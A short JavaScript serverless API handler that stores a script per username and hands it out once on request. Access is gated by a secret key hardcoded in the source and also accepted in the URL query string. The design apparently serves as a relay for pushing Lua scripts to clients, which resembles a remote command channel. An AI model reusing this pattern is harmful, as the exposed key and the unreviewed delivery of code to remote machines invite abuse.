// api/message.js
let userScripts = {};

// Secret key for auth
const SECRET_KEY = "LMAOXD_Key768675";

export default async function handler(req, res) {
    const body = req.body || {};
    const key = body.LMAOXD_Key768675 || req.query.LMAOXD_Key768675;
    const targetUser = body.username || req.query.username;

    if (key !== SECRET_KEY) return res.status(401).json({ error: "Unauthorized: Invalid Key" });

    // --- Store script for a specific username ---
    if (req.method === "POST") {
        if (!targetUser) return res.status(400).json({ error: "Username required" });
        userScripts[targetUser] = body.script || "--none";
        return res.status(200).json({ status: "stored" });
    }

    // --- Fetch script for a username ---
    if (req.method === "GET") {
        if (!targetUser) return res.status(400).json({ error: "Username required" });
        const script = userScripts[targetUser] || "--none";
        delete userScripts[targetUser]; // reset after fetch
        return res.status(200).send(script);
    }

    return res.status(405).json({ error: "Method Not Allowed" });
}
